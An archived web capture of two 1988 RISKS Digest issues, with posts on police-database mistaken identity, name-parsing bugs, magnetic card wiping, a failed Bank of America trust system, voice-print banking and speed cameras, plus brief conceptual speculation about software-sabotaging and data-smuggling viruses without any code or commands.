<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-65</DOCNO>
<DOCOLDNO>IA012-000130-B024-287</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.29.html 128.240.150.127 19970217015705 text/html 13754
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:55:33 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 29</TITLE>
<LINK REL="Prev" HREF="/Risks/6.28.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.30.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.28.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.30.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 29</H1>
<H2> Friday, 19 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
When in doubt, blame the computer.  Mistaken-identity nightmare. 
</A>
<DD>
<A HREF="#subj1.1">
PGN
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Re: Last Clasp credit cards; Mistaken identities 
</A>
<DD>
<A HREF="#subj2.1">
Wm Brown III
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Magnetic clasps on purses 
</A>
<DD>
<A HREF="#subj3.1">
Art Evans
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  Code-altering viruses 
</A>
<DD>
<A HREF="#subj4.1">
News System Administrator
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Viruses 
</A>
<DD>
<A HREF="#subj5.1">
Larry Nathanson
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
When in doubt, blame the computer.  Mistaken-identity nightmare.
</A>
</H3>
<address>
Peter G. Neumann 
&lt;<A HREF="mailto:NEUMANN@csl.sri.com">
NEUMANN@csl.sri.com
</A>&gt;
</address>
<i>
Fri 19 Feb 88 15:27:07-PST
</i><PRE>

  Neil Foster from Marlborough and Neil Foster from Somerset are both 38,
  with brown hair, moustaches, and almost the same height.  One was wanted
  for motor vehicle violations, but the other one got picked up.  The
  other one also lost his job, his savings, and his car in the process.
  Wiltshire police blamed their computer.  But other police admitted that
  the computer is "only an aid to identification, and information on it
  should always be cross-checked..."

  The real culprit was found after a three-month search by the other Neil
  Foster, who explained what had been happening and got the guilty one to
  go to the police.
  
  The national police computer system currently houses records of stolen
  and suspect vehicles, fingerprints, names of known criminals, wanted and
  missing persons, and disqualified drivers.  Plans are underway to expand
  it to use by the courts, the crown prosecution service, probation
  service and prisons.  It currently contains 25 million names.  An
  individual may be identified by name, age, sex, height, and vehicle
  type.  "In theory, with a correctly spelt name and date of birth, a case
  of mistaken identity should be impossible."

[Source: An article by Stephen Davis and Nick Rufford in the Sunday
Times, London, 10 January 1988, contributed anonymously.]

Lousy theory.  But in practice, I would think that adding birthplace might
help reduce the probability of two people with the same identification.  And
what about someone who lies about his/her age or height?

Here we have a case of an accidental name confusion.  Other such cases have
been reported in RISKS in which computer systems were implicated, but in
which human laziness may ultimately have been to blame -- such as the
Shirley Jackson and Sheila Jackson case in 1983.  This should be contrasted
with the case of Terry Dean Rogan, in which someone assumed his identity and
caused him great grief.  (Both of these cases were noted in Software
Engineering Notes 10 3, July 1985.)

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
 Re: Last Clasp credit cards (<A HREF="/Risks/6.28.html">RISKS-6.28</A>); Mistaken identities
</A>
</H3>
<address>
Wm Brown III 
&lt;<A HREF="mailto:Brown@GODZILLA.SCH.Symbolics.COM">
Brown@GODZILLA.SCH.Symbolics.COM
</A>&gt;
</address>
<i>
Thu, 18 Feb 88 18:16 PST
</i><PRE>

  From: Jack Holleran &lt;Holleran@DOCKMASTER.ARPA&gt; [...]
  First, you need a sufficient strength to really erase.  How much is enough?

How much is enough?  My last employer used a magnetic card key to provide us
with access to the building on weekends or after hours.  This was one of the
old brute-force types, about 2 mm thick, made of a flexible ferrite-plastic
composite like the magnet tape used to hold doors closed on refrigerators.
The magnetic field from the card was strong enough to levitate a very small
magnet inside the lock by a few thousandths, lifting it out of a hole and 
allowing the mechanism to move.  Several magnets were randomly located above 
the card slot, and of course each could be oriented in either of two ways.

Several people, myself included, had the bits wiped off our bank machine and/or
credit cards which lived next to these card keys in our wallets.  I have no
idea how to relate this field strength in absolute numbers, however we could
find the active spots in our cards by 'dowsing' for them with a staple on the
end of a piece of thread.  In other words, not very strong at all.  Certainly
not strong enough to work as a magnetic clasp.


[Unrelated pet peeve]     
          [But ironically related to Neil Foster in the first item above.  PGN]

I don't use the "III" suffix on my name out of vanity or pride; it isn't even
on my birth certificate (although I am indeed the third William E. Brown in
my family line).  I started using it way back when my mail, checks and credit 
ratings started getting mixed up with others, including my own Father's.  Do
you have any idea how many people named Bill Brown there are in Los Angeles?
Even with this fairly unique addition, I have still had lawyers, collection
agencies and even private detectives threaten me with someone else's problems.

Now for the computer connection:  very few programmers seem to allow for names 
with trailers.  Many computer-generated letters are addressed correctly, then
start out "Dear Mr. III".  Even the ones which allow for any number of name 
segments outsmart themselves by assuming that only the first character of a 
string should be capitalized, so "III" turns into "Iii".  Bank and government 
systems, whose owners aren't trying to be polite, often address things to 
"III, Wm. E. Brown".  I can often track who sells mailing lists to whom by 
the patterns of error propagation.

The best one, however, came last month when I bought a used car.  The dealer's
system which types out nineteen different and complex forms from one set of
input data simply decided that the last group of letters had to be my last
name, and that everyone has two initials plus one name.  Now I have an
extended protection policy from Ford, complete with an embossed plastic card,
in the name of "W E III".

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
magnetic clasps on purses
</A>
</H3>
<address>
"Art Evans" 
&lt;<A HREF="mailto:Evans@TL-20B.ARPA">
Evans@TL-20B.ARPA
</A>&gt;
</address>
<i>
Thu 18 Feb 88 10:03:42-EST
</i><PRE>

After reading on RISKS about danger to credit cards from magnetic clasps on
purses, I asked my wife if she owns such a purse; fortunately, she does not.
However, in the course of the discussion it occurred to us that she sometimes
carries floppy disks in her purse.  Now that seems to me like a real RISK
possibility.  With bad luck the card could be within 0.25 inch or so of the
magnet and in continuous movement with respect to it as the purse is carried.

Art Evans/Tartan Labs

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Code-altering viruses
</A>
</H3>
<address>
News System Administrator
&lt;<A HREF="mailto:uw-beaver!tikal!sigma!news@rutgers.edu ">
uw-beaver!tikal!sigma!news@rutgers.edu 
</A>&gt;
</address>
<i>
Thu, 18 Feb 88 23:16:54 pst
</i><PRE>
Organization: Summation Inc, Kirkland WA

In some discussions around here about the recent virus articles in comp.risks,
someone raised the idea of the inevitability of viruses that target specific 
software products.

Unlike the current run of viruses which seem to be either fairly innocuous or
generally destructive, this type of virus would be designed to quietly alter
some particular (probably commercial) software with the intent of making it
look faulty or buggy.

For example, a virus of this type might be designed to attack a Brand X 
spreadsheet, to cause it to perform some computations incorrectly. The 
effect might not show up immediately, but would certainly eventually leave
the user with a poor opinion of the program, which might not go away even 
after the existence of the virus became known and the problem fixed (after
all, this software would now be known to be vulnerable and targeted).
The economic cost to the spreadsheet vendor could be considerable.

One motivation for writing such a virus comes immediately to mind. This is
the disgruntled employee, the same legendary figure who leaves time-bombs
in employers' code. (Have any instances of this ever been successfully
prosecuted?). This would be harder to prove than the time-bomb: the (source)
code is not left in the employer's hands.

One of the more insidious aspects of this kind of virus is that it can do 
its job and go away (erasing itself once its mission is accomplished),
leaving no hint that the targeted utility has been damaged nor that a virus 
was responsible. The blame for the induced problem will naturally fall on
the author of the utility, especially when it shows up "all over".

(What laws and penalties would apply against the author of such a virus?)

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Viruses (Re: <A HREF="/Risks/6.28.html">RISKS-6.28</A>)
</A>
</H3>
<address>
Larry Nathanson
&lt;<A HREF="mailto:bucsb.bu.edu!lan@bucsb.bu.edu ">
bucsb.bu.edu!lan@bucsb.bu.edu 
</A>&gt;
</address>
<i>
Fri, 19 Feb 88 13:40:58 EST
</i><PRE>

	A few years ago, while I was in high school, I read a short desciption
of what a virus was, and decided to write my own.  It was short, (&lt;500 lines 
source code) and VERY contagious to a dos 3.3 disk.  Since it was a challenge
and not a malicous attempt to destroy data, when it triggered, all it said
was "BOO".  After a while I started wondering what use it could be, besides
the destruction of data.  One of the things I came upon, was that it could be 
used to get information out of a secure system.  For example,
let's take 3 sample computer systems: A, B, and C.  Someone at A
has a file that C wants.  B is a computer system that exchanges software, with
both A and C.  (B could also be a few computer systems, that exchange software
among themselves, and form a link from A to C.)  C introduces a virus to B's
system, with the hope that it will get to A's system.  All this virus does is 
check the date, and scan for a character string.  When a given character string
is located, it either opens up a communication channel to A, and dumps all
relevant information, or it appends a certain amount of the information to 
itself, and subtly changes itself: it is now an outbound virus, and will
only transfer the information to an already infected system.  Thus eventually,
the information will slowly come back to A.  If a copy of the "inbound" virus 
finds that the date is greater than a certain day, it decides that it is on a
dead end, and just erases itself. 

If a group of programmers, sat down, and came up with such a "smart" virus,
the implications could be staggering.  

Larry Nathanson         Boston Univ. CS Dept.          lan@bucsf.bu.edu

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
<A HREF="/Risks/6.28.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.30.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
Report problems with the web pages to <A HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">Lindsay.Marshall@newcastle.ac.uk</A>.
</BODY></HTML>
</DOC>
<DOC>
<DOCNO>WT11-B30-66</DOCNO>
<DOCOLDNO>IA012-000130-B024-310</DOCOLDNO>
<DOCHDR>
http://catless.ncl.ac.uk:80/Risks/6.30.html 128.240.150.127 19970217015719 text/html 21518
HTTP/1.0 200 OK
MIME-Version: 1.0
Date: Mon, 17 Feb 1997 01:55:45 GMT
Server: phttpd/0.99.72
Content-Type: text/html
</DOCHDR>
<HTML><HEAD><TITLE>The Risks Digest Volume 6: Issue 30</TITLE>
<LINK REL="Prev" HREF="/Risks/6.29.html">
<LINK REL="Up" HREF="/Risks/index.6.html">
<LINK REL="Next" HREF="/Risks/6.31.html">
<LINK REL="Help" HREF="/Risks">
<LINK REV="made" HREF="mailto:Lindsay.Marshall@newcastle.ac.uk">
</HEAD><BODY><HR>
<A HREF="/Risks/6.29.html"><IMG SRC="/Images/Buttons/granite_left.gif" ALT="Previous Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/index.6.html"><IMG SRC="/Images/Buttons/granite_up.gif" ALT="Index" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks/6.31.html"><IMG SRC="/Images/Buttons/granite_right.gif" ALT="Next Issue" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks"><IMG SRC="/Images/Buttons/granite_i.gif" ALT="Info" WIDTH="30" HEIGHT="30"></A>
<A HREF="/Risks.data/search.html"><IMG SRC="/Images/Buttons/granite_qm.gif" ALT="Searching" WIDTH="30" HEIGHT="30"></A>
<A HREF="mailto:risks@csl.sri.com"><IMG SRC="/Images/Buttons/granite_submit.gif" ALT="Submit Article" WIDTH="30" HEIGHT="30"></A>
<HR>
<H1>The Risks Digest Volume 6: Issue 30</H1>
<H2> Tuesday, 23 February 1988 </H2>
    <H3>Forum on Risks to the Public in Computers and Related Systems</H3>
    <I><A HREF="http://www.acm.org">ACM</A>
Committee on Computers and Public Policy, Peter G. Neumann, moderator</I>
<H2>Contents</H2><DL>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj1">
The risks of pressing the wrong key -- a taxing situation 
</A>
<DD>
<A HREF="#subj1.1">
Gligor Tashkovich
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj2">
  Taxing of information 
</A>
<DD>
<A HREF="#subj2.1">
Steven Koinm
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj3">
  Using viruses for copy protection 
</A>
<DD>
<A HREF="#subj3.1">
Doug McIlroy
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj4">
  What's in a Name, III 
</A>
<DD>
<A HREF="#subj4.1">
Vint Cerf
</A><br>
<A HREF="#subj4.2">
 John Pershing
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj5">
  Re: Mistaken Identity 
</A>
<DD>
<A HREF="#subj5.1">
Amos Shapir
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj6">
  Details of bank's costly computer foul-up 
</A>
<DD>
<A HREF="#subj6.1">
Rodney Hoffman
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj7">
  Voice-print security (and Rory Bremner) 
</A>
<DD>
<A HREF="#subj7.1">
J M Hicks
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj8">
  Auto-mated Citations 
</A>
<DD>
<A HREF="#subj8.1">
Mark Brader
</A><br>
<DT><IMG SRC="/Images/redball.gif" ALT= "o"><A HREF="#subj9">
  Re: Shuttle Security 
</A>
<DD>
<A HREF="#subj9.1">
Henry Spencer
</A><br>
</DL>

<A NAME="subj1"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj1.1">
The risks of pressing the wrong key -- a taxing situation
</A>
</H3>
<address>
Gligor Tashkovich
&lt;<A HREF="mailto:gligor%lerouf.DEC@decwrl.dec.com ">
gligor%lerouf.DEC@decwrl.dec.com 
</A>&gt;
</address>
<i>
21 Feb 88 13:01
</i><PRE>

Coopers &amp; Lybrand did my rough French taxes on Friday (courtesy of Digital) by
computer.  When the agent went to pull a screen of information that he had
entered on me, he pressed the wrong key and up came personal tax information
that was for another employee of Digital in my subsidiary.  All the important
confidential information was there including salary, real estate owned, etc.
  
The risk here is that information that you give to a tax person on a 
confidential basis might not be that confidential after all ...

</PRE>
<A NAME="subj2"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj2.1">
Taxing of information
</A>
</H3>
<address>
Steven Koinm 
&lt;<A HREF="mailto:goog@a.cs.okstate.edu">
goog@a.cs.okstate.edu
</A>&gt;
</address>
<i>

</i><PRE>
Date: 17 Feb 88 07:48:28 GMT
Organization: Oklahoma State Univ., Stillwater

I recently came across an interesting idea presented by a hacker while doing
research for a paper.  The hacker said that he could not consider
information property because it cannot be taxed.

But, what if it could.  How would you put a property tax on information?  How
can you say what the value of that information is?  It may be invaluable to 
you but it's still just a bunch of bits unless it is used?  Maybe if they 
were to keep track of each time you used a piece of information and then based
the amount of tax on that?

Would this make people stop collecting HUGE amounts of information that they
keep around just for the sake of "I'll need that someday" or "Why bother 
erasing it, it may still be valid."  

I just thought that this was an interesting thought...

GOOG ?? (a.k.a. Steve Koinm)                     
Computing and Information Sciences       Internet:  goog@a.cs.okstate.edu
Oklahoma State University                UUCP: {cbosgd, ihnp4,
Stillwater, OK  74075                           rutgers}!okstate!garnett\

</PRE>
<A NAME="subj3"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj3.1">
Using viruses for copy protection
</A>
</H3>
<address>
&lt;<A HREF="mailto:doug@research.att.com">
doug@research.att.com
</A>&gt;
</address>
<i>
Mon, 22 Feb 88 08:17:49 EST
</i><PRE>

I've not heard actual instances of latent viruses being used for copy
protection, although one of your correspondents asserted that had been done.
Anybody contemplating such a gimmick, however, had better think twice.  If you
booby trap your house and injure a burglar, or if you string a wire across a
hikers-only trail and decapitate an illegal biker, you are criminally liable.

Doug McIlroy

</PRE>
<A NAME="subj4"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj4.1">
Jr., Sr., III (<A HREF="/Risks/6.29.html">RISKS-6.29</A>)
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
21 Feb 1988 00:20-EST
</i><PRE>
From: CERF@A.ISI.EDU

RE: Mr. William E. Brown III, it's a good thing his name isn't
William W. Brown III or his card would read W W III !!

RE: systems that don't deal with trailers on names like Jr., Sr. or
III, MCI Mail specifically parses for these.
                                                    Vint

                         [Because Vint does not have one of these trailers, 
                         he cannot be accused of being Self-Cerfing.  PGN]

</PRE>
<HR><H3><A NAME="subj4.2">
Re: Mistaken Identity (RISKS DIGEST 6.29)
</A>
</H3>
<address>
Amos Shapir NSTA 
&lt;<A HREF="mailto:amos@nsc.NSC.COM">
amos@nsc.NSC.COM
</A>&gt;
</address>
<i>
Mon, 22 Feb 88 09:27:57 PST
</i><PRE>

The Israeli state collection agency issued a warrant for the arrest of a
debtor; since they had only his name (a rather common one) and the town he
lived in, a clerk completed the missing information - full address, ID number
and father's name - from the first entry for a person of the same name he found
in the citizen's registry.  That person had a very hard time (including an
overnight arrest) explaining to the authorities that it's not him ("but it is
*your* ID on the arrest form, isn't it?!").
                                                      Amos Shapir
			
National Semiconductor 7C/266  1135 Kern st. Sunnyvale (408) 721-8161
amos@nsc.com till March 1, 88; Then back to amos%taux01@nsc.com 

     [This one is computer-related in the sense that input data should
     acquire an appropriate measure of trustworthiness and then be
     handled accordingly.  That measure should stay with the data, as
     is the case with a security label.  PGN]

</PRE>
<A NAME="subj5"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj5.1">
Details of bank's costly computer foul-up
</A>
</H3>
<address>
&lt;<A HREF="mailto:">

</A>&gt;
</address>
<i>
7 Feb 88 18:36:54 PST (Sunday)
</i><PRE>
From: Rodney Hoffman &lt;Hoffman.es@Xerox.COM&gt;

In <A HREF="/Risks/5.16.html">RISKS-5.16</A> (25 July 1987) and again in <A HREF="/Risks/6.16.html">RISKS-6.16</A> (27 January 1988), I
related news accounts of Bank of America's failed attempt at an ambitious new
trust accounting and reporting system.

The Los Angeles Times for Sunday, February 7, 1988, carried a lengthy front-page
review of the entire debacle, "B OF A'S PLANS FOR COMPUTER DON'T ADD UP" by
Douglas Frantz.  The article includes lots of background history and economics.
Here are a few edited excerpts giving more details than the previous accounts:

  Last month, Bank of America acknowledged that it was abandoning the $20 
  million computer system after wasting another $60 million trying to make 
  it work.  The bank will no longer handle processing for its trust division, 
  and the biggest accounts were given to a Boston bank.  Top executives 
  have lost their jobs already and an undisclosed number of layoffs are in
  the works.
  
  ...The total abandonment of a computer system after five years of develop-
  ment and nearly a year of false starts raises questions about the bank's
  ability to overcome its technological inadequacy in an era when money is
  often nothing more than a blip on a computer screen....   
  
  In 1981, the bank had fallen far behind in the computer race.  Then-new
  chairman Armacost launched a $4-billion spending program to push B of A 
  back to the technological forefront.  The phrase he liked was "leap-
  frogging into the 1990s," and one area that he chose to emphasize was 
  the trust deparment.... 
  
  The bank was mired in a 1960s-vintage accounting and reporting system.  
  An effort to update the system ended in a $6-million failure in 1981 
  after the company's computer engineers worked for more than a year with-
  out developing a usable system.....  
  
  In the fall of 1982, bank officers met Steven M. Katz, a pioneer in creat-
  ing software for bank trust departments.... In 1980, he had left SEI Corp. 
  in a dispute and founded rival Premier Systems.
    
  Katz insisted on using Prime instead of B of A's IBM computers.  He boasted 
  that he could put together a system by 1983.  Within six months, a B of A - 
  led consortium of banks agreed to advance Premier money to develop a new, 
  cutting-edge system for trust reporting and accounting.  Nearly a year was 
  spent on additional research....  The go-ahead to fund to project came in 
  March, 1984.  While it was not a deadline, the goal was to have the new  
  system in operation by Dec. 31, 1984.
  
  What followed was a textbook structure for designing a computer system.  A
  committee was formed of representatives from each B of A department that
  would use the system and they met monthly to discuss their requirements.  
  DP staff gathered for a week each month to review progress and discuss 
  their needs with the Premier designers.  Some of the DP experts found Katz
  difficult to deal with occasionally, especially when they offered views on
  technical aspects of the project.  "Don't give us the solutions.  Just tell
  us the problems," Katz often said.
  
  When the ambitious Dec. 31, 1984, goal was passed without a system, no one
  was concerned.  There was progress, and those involved were excited about 
  the unfolding system and undaunted by the size of the task.  B of A devoted
  20 man-years to testing the software system and its 3.5 million lines of
  code; 13,000 hours of training, including rigorous testing, were provided
  to the staff that would run the system....
  
  In spring 1986, the system was about ready.  Some smaller parts were already
  working smoothly.  Test runs had not been perfect, but the technicians
  thought most bugs could be worked out soon.  A demonstration run had been
  successful....
  
  Many employees were operating both systems, working double shifts and
  weekends.  Late in 1986, an anonymous letter warned against a "rush to
  convert" to the new system and told the manager, not a computer expert, 
  that people had "pulled the wool" over his eyes.  The executive assured 
  the staff that there would be no conversion before it was time.  By then,
  lines of authority had also changed, making cooperation difficult.
  
  By early 1987, tests had been running with only a few bugs.  "There were
  still bugs, but the users felt they could run with it and work out the
  bugs as we went along," one former executive said.  A conversion date was
  set:  March 2, 1987.  
  
  Just then, half the DP staff was pulled off the assignment.  The conversion
  lasted one week.  On March 7, the first of the 24 disk drive units on the 
  Prime computers blew up, causing the loss of a portion of the database.  It
  was past midnight each night before workers retrieving data from a backup
  unit left the offices.  Over the next month, at least 14 more of the disk 
  drives blew up.  None had malfunctioned in the previous months of test.  
  
  It turned out that the units were part of a faulty batch manufactured by
  Control Data Corp.  But by the time the cause was discovered, delays had
  mounted and other difficulties had arisen.  Taken individually, none would
  have caused the ensuing disaster.  Together, they doomed the system.  
  
  At the same time, the bank decided to move the main staff 30 miles away.  
  Key people quit and morale sank.  Another section of staff was told they
  would be moving from Los Angeles to San Francisco, with many losing their
  jobs.  [Conflicts, turf battles, consulting firms, temporary employees]
  
  The bank's first public acknowledgement of the problems came in July 1987.
  [See <A HREF="/Risks/5.16.html">RISKS-5.16</A>]  An in-house investigation was viewed by many staff mem-
  bers as a witch hunt.  The bank announced further costs and then the trans-
  fer of the accounts in January 1988.  [See <A HREF="/Risks/6.16.html">RISKS-6.16</A>]
  
  The bank's one-time head of the program, since resigned, says, "A lot of
  people lay down on the floor and spilled blood over this system, and why
  they abandoned it now I cannot understand.  A guy called me this morning 
  out of the blue and said that 95% of it was working very well."
  

</PRE>
<A NAME="subj6"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj6.1">
   Voice-print security (and Rory Bremner)
</A>
</H3>
<address>
J M Hicks 
&lt;<A HREF="mailto:cudat@DAISY.WARWICK.AC.UK">
cudat@DAISY.WARWICK.AC.UK
</A>&gt;
</address>
<i>

</i><PRE>

On Saturday 20th February, the B.B.C. Radio 4 programme "Money Box" broadcast
an item about a service provided by a bank in Britain.  (I didn't catch the
name of the bank --- a pity.)  The service is provided by telephone.  No
mention was made about any kind of secret personal code to confirm the identity
of a customer --- security is afforded by the bank's computer's memory of one's
"voice-print", i.e. it can tell who you are just by listening to your voice.
I believe "funds transfer" is one of the services provided.

    The representative of the bank was asked about the possibility of someone
impersonating a customer.  He replied that the bank had engaged Rory Bremner,
a well-known mimic, to try to mimic other people and deceive the computer.
Rory couldn't.

    Suppose someone recorded someone else's voice and played that down the
telephone line?  (I think the recording would have to be made while the victim
was using the service, though --- after speaking each digit to the computer one
has to wait for a confirmatory beep.  Ordinary fluent speech would not do.)

    What do readers think of the idea of dispensing with the secret
personal code?

(Respondents should bear in mind that few people in Britain have telephones
with multi-tone dialing.)

J. M. Hicks (a.k.a. Hilary),
Computing Services, Warwick University, Coventry, England. CV4 7AL
On JANET:  cudat@UK.AC.WARWICK.CU (in the U.K.)
On uucp:   ...!ihnp4!mcvax!ukc!warwick!cudat

    [Distressing to see the old argument, "Our best forger couldn't break
    it, so it must be pretty good."  Voice-prints are difficult to mimic by
    voice, but easy to spoof by playback attacks.  On the other hand, 
    personal codes (PIN numbers) are also not wholly dependable.  RISKS 
    readers know by now that just about every attempt to gain user
    convenience has some intrinsic vulnerabilities.  PGN]

</PRE>
<A NAME="subj7"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj7.1">
Auto-mated Citations
</A>
</H3>
<address>
Mark Brader
&lt;<A HREF="mailto:msb@sq.com ">
msb@sq.com 
</A>&gt;
</address>
<i>
Mon, 15 Feb 88 22:13:02 EST
</i><PRE>

Following are excerpts from a Usenet discussion going on in the newsgroups
sci.electronic, rec.autos, and (!) rec.ham-radio.  The excerpts were selected,
sequenced, and forwarded to RISKS by Mark Brader.

John Moore (john@tower.UUCP):

  Here in Paradise Valley, Arizona, we have the dubious distinction of
  being the only place in the US where speeding tickets are given by
  mail after an automatic device snaps your picture and speed!

Norm Strong (strong@tc.fluke.COM):

  Most countries in the world hold the owner responsible for
  speeding, regardless of who's driving.  This isn't possible
  in the US because we have a constitution that prohibits it.

Richard Welty (welty@sunbarney.UUCP):

  This* proves to be alterable via local statute.  Communities that are
  trying out the robocop have altered their laws so that they may charge
  the owner if said owner refuses to identify the driver at the time of
  the infraction.  I wonder if the owner gets any points from this ...
    [* No, he didn't mean the US constitution -- msb]

Ron Natalie (ron@topaz.rutgers.edu):

  I was wondering when someone was going to bring up the question of
  "it's not me driving."  I have no idea how Arizona deals with it, but
  a friend who was stationed in Germany told he how it is dealt with there.
  If the driver in the picture is not positively identifiable as you, they
  will let you off on the provision that you log whereever you drive.  Hence,
  if you get your picture taken again, you will have a before the fact
  record of if you were there.  Not keeping your log truthfully is a
  serious offense.

Mad Matt Schaefer (matt@cs.wisc.edu):

  I've heard of this system in Europe (Germany?) and somebody told me that it
  became unpopular with government officials and other important people because
  the ticket and picture came in the mail while the guy was at work and his
  wife opened it and saw the picture of the car, plate, speed, husband, and
  *the other woman* in the car with him. I thought, "this guy is not gonna get
  the welcome he is expecting when he gets home."

</PRE>
<A NAME="subj8"> <IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"></A>
<H3><A NAME="subj8.1">
Re: Shuttle Security
</A>
</H3>
<address>
&lt;<A HREF="mailto:mnetor!utzoo!henry@uunet.UU.NET">
mnetor!utzoo!henry@uunet.UU.NET
</A>&gt;
</address>
<i>
Sat, 20 Feb 88 18:44:47 EST
</i><PRE>

&gt; ... 7 packages of microfilm classified "Confidential" were left
&gt; unsecured for 8 months.  Each package of microfilm contained 181 sheets,
&gt; listing 4,205 confidential radio frequencies ...
&gt; What does this do to a risk analysis of shuttle safety? ...

Probably nothing much.  There is NO SUCH THING as a "confidential radio 
frequency" if it is in active use.  It's just not that hard to eavesdrop
enough to find out which frequencies are being used, and make good guesses
about what they are being used for.  (For example, triangulation will tell
you which transmissions are coming from the range-safety transmitters.)
The real security of the system rests on the secret codes used to trigger
action, and on the difficulty of outshouting the range-safety transmitters
(which send continuously at high power to make it hard for a false signal
to be heard).  Refusing to publish the frequency is just an extra obstacle,
and not a very important one.

This whole thing sounds like a tempest in a teapot, actually.  "Confidential"
is not a very high classification.  Long odds that nothing of real importance
was in those microfilms.

Henry Spencer @ U of Toronto Zoology {allegra,ihnp4,decvax,pyramid}!utzoo!henry

</PRE>

<IMG SRC="/Images/Lines/hrfadeblue.gif" ALT="---------------------------------------------"><P>
